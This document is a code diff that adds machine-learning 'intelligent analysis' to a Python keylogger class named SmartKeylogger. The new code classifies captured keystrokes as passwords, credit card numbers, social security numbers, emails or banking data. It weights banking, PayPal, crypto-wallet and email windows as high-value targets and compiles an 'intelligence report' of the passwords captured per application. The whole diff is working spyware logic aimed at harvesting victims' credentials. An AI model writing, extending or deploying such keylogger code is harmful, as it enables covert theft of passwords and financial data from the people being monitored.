@@ -19,6 +19,12 @@ from pynput import keyboard, mouse
 from dataclasses import dataclass, field
 from pathlib import Path
 
+# AI imports for intelligent keylogging analysis
+from sklearn.ensemble import RandomForestClassifier
+from sklearn.feature_extraction.text import TfidfVectorizer
+from sklearn.cluster import KMeans
+import joblib
+
 @dataclass
 class KeyStroke:
     """Thông tin về một keystroke"""
@@ -50,6 +56,17 @@ class SmartKeylogger:
         self.keystrokes: List[KeyStroke] = []
         self.form_inputs: List[FormInput] = []
         self.clipboard_data: List[Dict] = []
+        
+        # AI Components for intelligent analysis
+        self.ai_password_detector = None
+        self.ai_sensitive_classifier = None
+        self.ai_pattern_analyzer = None
+        self.text_vectorizer = TfidfVectorizer(max_features=1000)
+        self.pattern_history = []
+        self.classification_history = []
+        
+        # Initialize AI models
+        self._init_ai_models()
         
         # Patterns for detection
         self.password_patterns: Set[str] = {
@@ -461,3 +478,378 @@ class SmartKeylogger:
                 json.dump(data, f, indent=2, default=str)
         except Exception:
             pass
+    
+    def _init_ai_models(self):
+        """Initialize AI models for intelligent keylogging"""
+        try:
+            # Password detection classifier
+            self.ai_password_detector = RandomForestClassifier(
+                n_estimators=50,
+                max_depth=10,
+                random_state=42
+            )
+            
+            # Sensitive data classifier
+            self.ai_sensitive_classifier = RandomForestClassifier(
+                n_estimators=50,
+                max_depth=8,
+                random_state=42
+            )
+            
+            # Pattern clustering for behavior analysis
+            self.ai_pattern_analyzer = KMeans(
+                n_clusters=5,
+                random_state=42
+            )
+            
+        except Exception as e:
+            print(f"Failed to initialize AI models: {e}")
+    
+    def ai_analyze_keystroke_pattern(self, keystrokes: List[KeyStroke]) -> Dict[str, Any]:
+        """Use AI to analyze keystroke patterns for sensitive information"""
+        try:
+            if not keystrokes:
+                return {'type': 'unknown', 'confidence': 0.0, 'sensitive': False}
+            
+            # Extract text from keystrokes
+            text = ''.join([ks.key for ks in keystrokes if len(ks.key) == 1])
+            
+            # Get context information
+            window_title = keystrokes[-1].window_title.lower() if keystrokes else ''
+            process_name = keystrokes[-1].process_name.lower() if keystrokes else ''
+            
+            analysis = {
+                'type': 'text',
+                'confidence': 0.0,
+                'sensitive': False,
+                'reasons': [],
+                'text_content': text,
+                'metadata': {
+                    'window_title': window_title,
+                    'process_name': process_name,
+                    'keystroke_count': len(keystrokes)
+                }
+            }
+            
+            # AI-powered password detection
+            if self._ai_detect_password_context(text, window_title, process_name):
+                analysis['type'] = 'password'
+                analysis['sensitive'] = True
+                analysis['confidence'] += 0.7
+                analysis['reasons'].append('AI password context detected')
+            
+            # AI-powered sensitive data detection
+            sensitive_score = self._ai_detect_sensitive_data(text)
+            if sensitive_score > 0.6:
+                analysis['sensitive'] = True
+                analysis['confidence'] += sensitive_score * 0.8
+                analysis['reasons'].append(f'AI sensitive data detection: {sensitive_score:.2f}')
+            
+            # Pattern-based analysis
+            pattern_results = self._analyze_text_patterns(text)
+            if pattern_results['sensitive']:
+                analysis['sensitive'] = True
+                analysis['confidence'] += 0.5
+                analysis['reasons'].extend(pattern_results['matches'])
+            
+            # Context analysis
+            context_score = self._analyze_context(window_title, process_name)
+            analysis['confidence'] += context_score * 0.3
+            
+            # Record for learning
+            self._record_analysis_result(analysis, keystrokes)
+            
+            return analysis
+            
+        except Exception as e:
+            print(f"AI keystroke analysis failed: {e}")
+            return {'type': 'unknown', 'confidence': 0.0, 'sensitive': False}
+    
+    def _ai_detect_password_context(self, text: str, window_title: str, process_name: str) -> bool:
+        """AI-powered password context detection"""
+        try:
+            # Extract features for AI analysis
+            features = self._extract_password_features(text, window_title, process_name)
+            
+            # Use AI model if trained
+            if hasattr(self.ai_password_detector, 'predict') and len(self.classification_history) > 20:
+                try:
+                    prediction = self.ai_password_detector.predict([features])[0]
+                    return prediction == 1
+                except:
+                    pass
+            
+            # Fallback to heuristic analysis
+            return self._heuristic_password_detection(text, window_title, process_name)
+            
+        except Exception as e:
+            print(f"Password context detection failed: {e}")
+            return False
+    
+    def _extract_password_features(self, text: str, window_title: str, process_name: str) -> List[float]:
+        """Extract features for password detection"""
+        try:
+            features = []
+            
+            # Text features
+            features.extend([
+                len(text),
+                len(set(text)) / max(len(text), 1),  # Character diversity
+                sum(1 for c in text if c.isupper()) / max(len(text), 1),  # Uppercase ratio
+                sum(1 for c in text if c.islower()) / max(len(text), 1),  # Lowercase ratio
+                sum(1 for c in text if c.isdigit()) / max(len(text), 1),  # Digit ratio
+                sum(1 for c in text if not c.isalnum()) / max(len(text), 1),  # Special char ratio
+                int(any(word in text.lower() for word in self.password_patterns))
+            ])
+            
+            # Window context features
+            window_indicators = ['login', 'sign', 'auth', 'password', 'security', 'account']
+            features.extend([
+                int(any(indicator in window_title for indicator in window_indicators)),
+                int('browser' in process_name or 'chrome' in process_name or 'firefox' in process_name),
+                int('bank' in window_title or 'finance' in window_title),
+                int('email' in window_title or 'mail' in window_title)
+            ])
+            
+            return features
+            
+        except Exception as e:
+            print(f"Feature extraction failed: {e}")
+            return [0.0] * 11
+    
+    def _heuristic_password_detection(self, text: str, window_title: str, process_name: str) -> bool:
+        """Heuristic password detection as fallback"""
+        # Check for password indicators in window title
+        if any(pattern in window_title for pattern in self.password_patterns):
+            return True
+        
+        # Check text characteristics
+        if len(text) >= 6:  # Minimum password length
+            has_variety = (
+                any(c.isupper() for c in text) and
+                any(c.islower() for c in text) and
+                any(c.isdigit() for c in text)
+            )
+            if has_variety:
+                return True
+        
+        return False
+    
+    def _ai_detect_sensitive_data(self, text: str) -> float:
+        """AI-powered sensitive data detection"""
+        try:
+            # Pattern matching for known sensitive data
+            sensitivity_score = 0.0
+            
+            # Credit card pattern
+            if re.search(r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b', text):
+                sensitivity_score += 0.9
+            
+            # Email pattern
+            if re.search(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', text):
+                sensitivity_score += 0.6
+            
+            # Phone number pattern
+            if re.search(r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b', text):
+                sensitivity_score += 0.5
+            
+            # Social Security Number
+            if re.search(r'\b\d{3}-\d{2}-\d{4}\b', text):
+                sensitivity_score += 0.8
+            
+            # Banking keywords
+            banking_keywords = ['account', 'routing', 'swift', 'iban', 'pin']
+            for keyword in banking_keywords:
+                if keyword in text.lower():
+                    sensitivity_score += 0.3
+                    break
+            
+            return min(1.0, sensitivity_score)
+            
+        except Exception as e:
+            print(f"Sensitive data detection failed: {e}")
+            return 0.0
+    
+    def _analyze_text_patterns(self, text: str) -> Dict[str, Any]:
+        """Analyze text for sensitive patterns"""
+        result = {'sensitive': False, 'matches': []}
+        
+        for pattern in self.sensitive_patterns:
+            if re.search(pattern, text):
+                result['sensitive'] = True
+                result['matches'].append(f'Pattern match: {pattern}')
+        
+        return result
+    
+    def _analyze_context(self, window_title: str, process_name: str) -> float:
+        """Analyze context for sensitivity scoring"""
+        score = 0.0
+        
+        # High-value applications
+        high_value_apps = ['banking', 'paypal', 'crypto', 'wallet', 'tax', 'finance']
+        for app in high_value_apps:
+            if app in window_title.lower() or app in process_name.lower():
+                score += 0.8
+                break
+        
+        # Browser with secure sites
+        if 'browser' in process_name or any(browser in process_name for browser in ['chrome', 'firefox', 'edge']):
+            secure_indicators = ['https', 'secure', 'login', 'account']
+            if any(indicator in window_title.lower() for indicator in secure_indicators):
+                score += 0.6
+        
+        # Email clients
+        email_clients = ['outlook', 'thunderbird', 'mail']
+        if any(client in process_name.lower() for client in email_clients):
+            score += 0.4
+        
+        return min(1.0, score)
+    
+    def _record_analysis_result(self, analysis: Dict, keystrokes: List[KeyStroke]):
+        """Record analysis result for AI learning"""
+        try:
+            record = {
+                'timestamp': time.time(),
+                'analysis': analysis,
+                'keystroke_count': len(keystrokes),
+                'text_length': len(analysis.get('text_content', '')),
+                'window_title': keystrokes[-1].window_title if keystrokes else '',
+                'process_name': keystrokes[-1].process_name if keystrokes else ''
+            }
+            
+            self.classification_history.append(record)
+            
+            # Keep only recent records
+            if len(self.classification_history) > 1000:
+                self.classification_history = self.classification_history[-1000:]
+                
+        except Exception as e:
+            print(f"Failed to record analysis result: {e}")
+    
+    def ai_adaptive_learning(self):
+        """Update AI models with collected data"""
+        try:
+            if len(self.classification_history) < 50:
+                return
+            
+            # Prepare training data
+            X = []
+            y_password = []
+            y_sensitive = []
+            
+            for record in self.classification_history[-500:]:  # Use last 500 records
+                analysis = record['analysis']
+                text = analysis.get('text_content', '')
+                window_title = record['window_title']
+                process_name = record['process_name']
+                
+                features = self._extract_password_features(text, window_title, process_name)
+                X.append(features)
+                
+                y_password.append(1 if analysis['type'] == 'password' else 0)
+                y_sensitive.append(1 if analysis['sensitive'] else 0)
+            
+            if len(X) >= 20:
+                try:
+                    # Train password detector
+                    self.ai_password_detector.fit(X, y_password)
+                    print("Password detector model updated")
+                    
+                    # Train sensitive data classifier
+                    self.ai_sensitive_classifier.fit(X, y_sensitive)
+                    print("Sensitive data classifier updated")
+                    
+                except Exception as e:
+                    print(f"Model training failed: {e}")
+            
+        except Exception as e:
+            print(f"Adaptive learning failed: {e}")
+    
+    def ai_generate_intelligence_report(self) -> Dict[str, Any]:
+        """Generate AI-powered intelligence report"""
+        try:
+            report = {
+                'summary': {
+                    'total_keystrokes': len(self.keystrokes),
+                    'sensitive_inputs': 0,
+                    'password_inputs': 0,
+                    'applications_monitored': set(),
+                    'time_range': None
+                },
+                'sensitive_data_types': {},
+                'application_analysis': {},
+                'risk_assessment': 'low',
+                'recommendations': []
+            }
+            
+            # Analyze collected data
+            sensitive_count = 0
+            password_count = 0
+            app_data = {}
+            
+            # Process keystrokes in chunks for analysis
+            for i in range(0, len(self.keystrokes), 50):
+                chunk = self.keystrokes[i:i+50]
+                if chunk:
+                    analysis = self.ai_analyze_keystroke_pattern(chunk)
+                    
+                    app_name = chunk[-1].process_name
+                    report['summary']['applications_monitored'].add(app_name)
+                    
+                    if app_name not in app_data:
+                        app_data[app_name] = {'keystrokes': 0, 'sensitive': 0, 'passwords': 0}
+                    
+                    app_data[app_name]['keystrokes'] += len(chunk)
+                    
+                    if analysis['sensitive']:
+                        sensitive_count += 1
+                        app_data[app_name]['sensitive'] += 1
+                        
+                        data_type = analysis['type']
+                        if data_type not in report['sensitive_data_types']:
+                            report['sensitive_data_types'][data_type] = 0
+                        report['sensitive_data_types'][data_type] += 1
+                    
+                    if analysis['type'] == 'password':
+                        password_count += 1
+                        app_data[app_name]['passwords'] += 1
+            
+            # Update summary
+            report['summary']['sensitive_inputs'] = sensitive_count
+            report['summary']['password_inputs'] = password_count
+            report['summary']['applications_monitored'] = list(report['summary']['applications_monitored'])
+            
+            if self.keystrokes:
+                report['summary']['time_range'] = {
+                    'start': self.keystrokes[0].timestamp,
+                    'end': self.keystrokes[-1].timestamp
+                }
+            
+            # Application analysis
+            report['application_analysis'] = app_data
+            
+            # Risk assessment
+            total_chunks = max(len(self.keystrokes) // 50, 1)
+            risk_ratio = sensitive_count / total_chunks
+            
+            if risk_ratio > 0.3:
+                report['risk_assessment'] = 'high'
+                report['recommendations'].extend([
+                    'High volume of sensitive data detected',
+                    'Consider enhanced security monitoring',
+                    'Review data handling procedures'
+                ])
+            elif risk_ratio > 0.1:
+                report['risk_assessment'] = 'medium'
+                report['recommendations'].extend([
+                    'Moderate sensitive data activity',
+                    'Monitor for data leakage patterns'
+                ])
+            else:
+                report['risk_assessment'] = 'low'
+            
+            return report
+            
+        except Exception as e:
+            print(f"Intelligence report generation failed: {e}")
+            return {'error': str(e)}
